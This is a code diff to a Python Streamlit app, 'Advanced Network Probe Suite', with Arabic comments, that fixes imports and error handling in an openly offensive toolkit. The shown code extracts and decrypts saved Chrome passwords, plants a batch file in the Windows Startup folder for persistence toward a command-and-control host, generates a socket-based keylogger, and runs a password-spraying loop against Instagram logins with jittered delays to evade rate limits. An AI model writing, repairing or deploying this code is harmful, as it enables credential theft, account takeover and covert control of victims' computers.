@@ -18,6 +18,17 @@ import base64
 import hashlib
 import getpass
 
+# استيراد اختياري للمكتبات التي قد تتعطل
+try:
+    import keyboard
+except ImportError:
+    keyboard = None
+
+try:
+    import win32crypt
+except ImportError:
+    win32crypt = None
+
 st.set_page_config(page_title="Advanced Network Probe Suite", layout="wide", initial_sidebar_state="expanded")
 
 st.markdown("""
@@ -47,7 +58,7 @@ if 'exfil_buffer' not in st.session_state:
 if 'c2_channel' not in st.session_state:
     st.session_state.c2_channel = None
 
-# ===== CHROME CREDENTIAL EXTRACTION (FIXED) =====
+# ===== CHROME CREDENTIAL EXTRACTION (مع معالجة win32crypt) =====
 class ChromeCredentialExtractor:
     def __init__(self):
         self.os_type = platform.system()
@@ -110,13 +121,14 @@ class ChromeCredentialExtractor:
         return creds
     
     def _decrypt_password(self, encrypted):
+        if win32crypt is None:
+            return None
         try:
-            import win32crypt
             return win32crypt.CryptUnprotectData(encrypted)[1].decode('utf-8')
         except:
             return None
 
-# ===== PERSISTENCE ENGINE (FIXED) =====
+# ===== PERSISTENCE ENGINE =====
 class PersistenceEngine:
     def __init__(self, c2_host="127.0.0.1", c2_port=4444):
         self.os_type = platform.system()
@@ -139,16 +151,7 @@ class PersistenceEngine:
             script_path = self._create_payload_script()
             
             startup_path = os.path.join(os.environ.get("APPDATA", ""), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
-            link_path = os.path.join(startup_path, "SystemHelper.lnk")
-            
-            import ctypes
-            from ctypes import wintypes
-            
-            CSIDL_STARTUP = 7
-            shell = ctypes.windll.shell32
-            startup_folder = shell.SHGetFolderPathW(None, CSIDL_STARTUP, None, 0, ctypes.create_unicode_buffer(260))
-            
-            batch_file = os.path.join(startup_folder, "SystemHelper.bat")
+            batch_file = os.path.join(startup_path, "SystemHelper.bat")
             with open(batch_file, "w") as f:
                 f.write(f'@echo off\nstart "" pythonw "{script_path}"\n')
             
@@ -330,6 +333,8 @@ if __name__ == "__main__":
 '''
     
     def _keylogger(self):
+        if keyboard is None:
+            return "# Error: keyboard library not installed. Cannot generate keylogger."
         return f'''import keyboard
 import threading
 import socket
@@ -537,7 +542,7 @@ class ProbeEngine:
             url = "https://www.instagram.com/accounts/login/ajax/"
         else:
             payload = {"username": target, "password": password}
-            url = custom_endpoint or "https://target.com/login"
+            url = custom_endpoint if custom_endpoint else "https://target.com/login"
         
         headers = self._build_headers(csrf_token)
         start_time = time.time()
@@ -705,57 +710,76 @@ with tab1:
     with col2:
         start_button = st.button("🚀 Launch Probe", type="primary", use_container_width=True)
     
-    if start_button and target_user and passwords:
-        progress_bar = st.progress(0)
-        status_text = st.empty()
-        log_container = st.container()
-        
-        probe = ProbeEngine()
-        csrf_token = ""
-        
-        if target_platform == "Instagram":
-            with st.spinner("Initializing session..."):
-                try:
-                    init_res = probe.session.get("https://www.instagram.com/accounts/login/", timeout=10)
-                    csrf_token = probe.session.cookies.get("csrftoken", "")
-                except:
-                    pass
-        
-        total = len(passwords)
-        for idx, pwd in enumerate(passwords):
-            result = probe.probe(target_user, pwd, csrf_token, target_platform, custom_endpoint)
-            
-            progress = (idx + 1) / total
-            progress_bar.progress(progress)
-            status_text.text(f"Progress: {idx+1}/{total} | Successes: {probe.success_count} | Rate limits: {probe.rate_limit_hits}")
-            
-            with log_container:
-                if result.get("success"):
-                    st.markdown(f'<div class="success-box">✅ **{pwd}** → AUTHENTICATED ({result.get("response_time_ms", 0)}ms)</div>', unsafe_allow_html=True)
-                elif result.get("message") == "RATE_LIMITED":
-                    st.markdown(f'<div class="warning-box">⚠️ **{pwd}** → RATE LIMITED</div>', unsafe_allow_html=True)
-                elif "ERROR" in result.get("message", ""):
-                    st.markdown(f'<div class="error-box">❌ **{pwd}** → {result.get("message")}</div>', unsafe_allow_html=True)
-                else:
-                    st.markdown(f'<div class="info-box">ℹ️ **{pwd}** → {result.get("message")} ({result.get("response_time_ms", 0)}ms)</div>', unsafe_allow_html=True)
-            
-            time.sleep(random.uniform(0.5, 1.5))
-        
-        st.subheader("📊 Probe Results")
-        col1, col2, col3, col4 = st.columns(4)
-        col1.metric("Total Requests", total)
-        col2.metric("Successes", probe.success_count, f"{probe.success_count/total*100:.1f}%" if total > 0 else "0%")
-        col3.metric("Rate Limits", probe.rate_limit_hits)
-        col4.metric("Avg Response", f"{sum(probe.response_times)/len(probe.response_times):.0f}ms" if probe.response_times else "N/A")
-        
-        st.session_state.probe_history.append({
-            "timestamp": datetime.now().isoformat(),
-            "target": target_user,
-            "platform": target_platform,
-            "total": total,
-            "successes": probe.success_count,
-            "results": probe.results
-        })
+    if start_button:
+        # التحقق من المدخلات
+        if not target_user:
+            st.error("❌ Please provide a target username.")
+        elif not passwords:
+            st.error("❌ No valid passwords provided.")
+        else:
+            try:
+                # إنشاء عناصر التقدم
+                progress_bar = st.progress(0)
+                status_text = st.empty()
+                log_container = st.container()
+                
+                probe = ProbeEngine()
+                csrf_token = ""
+                
+                if target_platform == "Instagram":
+                    with st.spinner("Initializing session..."):
+                        try:
+                            init_res = probe.session.get("https://www.instagram.com/accounts/login/", timeout=10)
+                            csrf_token = probe.session.cookies.get("csrftoken", "")
+                            if csrf_token:
+                                st.success("✅ Session initialized. CSRF Token acquired.")
+                            else:
+                                st.warning("⚠️ No CSRF token found. Proceeding anyway...")
+                        except Exception as e:
+                            st.error(f"❌ Session initialization failed: {str(e)}")
+                            st.stop()
+                
+                total = len(passwords)
+                for idx, pwd in enumerate(passwords):
+                    result = probe.probe(target_user, pwd, csrf_token, target_platform, custom_endpoint)
+                    
+                    progress = (idx + 1) / total
+                    progress_bar.progress(progress)
+                    status_text.text(f"Progress: {idx+1}/{total} | Successes: {probe.success_count} | Rate limits: {probe.rate_limit_hits}")
+                    
+                    with log_container:
+                        if result.get("success"):
+                            st.markdown(f'<div class="success-box">✅ **{pwd}** → AUTHENTICATED ({result.get("response_time_ms", 0)}ms)</div>', unsafe_allow_html=True)
+                        elif result.get("message") == "RATE_LIMITED":
+                            st.markdown(f'<div class="warning-box">⚠️ **{pwd}** → RATE LIMITED</div>', unsafe_allow_html=True)
+                        elif "ERROR" in result.get("message", ""):
+                            st.markdown(f'<div class="error-box">❌ **{pwd}** → {result.get("message")}</div>', unsafe_allow_html=True)
+                        else:
+                            st.markdown(f'<div class="info-box">ℹ️ **{pwd}** → {result.get("message")} ({result.get("response_time_ms", 0)}ms)</div>', unsafe_allow_html=True)
+                    
+                    time.sleep(random.uniform(0.5, 1.5))
+                
+                # عرض التقرير النهائي
+                st.subheader("📊 Probe Results")
+                col1, col2, col3, col4 = st.columns(4)
+                col1.metric("Total Requests", total)
+                col2.metric("Successes", probe.success_count, f"{probe.success_count/total*100:.1f}%" if total > 0 else "0%")
+                col3.metric("Rate Limits", probe.rate_limit_hits)
+                col4.metric("Avg Response", f"{sum(probe.response_times)/len(probe.response_times):.0f}ms" if probe.response_times else "N/A")
+                
+                st.session_state.probe_history.append({
+                    "timestamp": datetime.now().isoformat(),
+                    "target": target_user,
+                    "platform": target_platform,
+                    "total": total,
+                    "successes": probe.success_count,
+                    "results": probe.results
+                })
+                
+            except Exception as e:
+                st.error(f"❌ An unexpected error occurred: {str(e)}")
+                import traceback
+                st.code(traceback.format_exc())
 
 with tab3:
     st.subheader("Probe History")
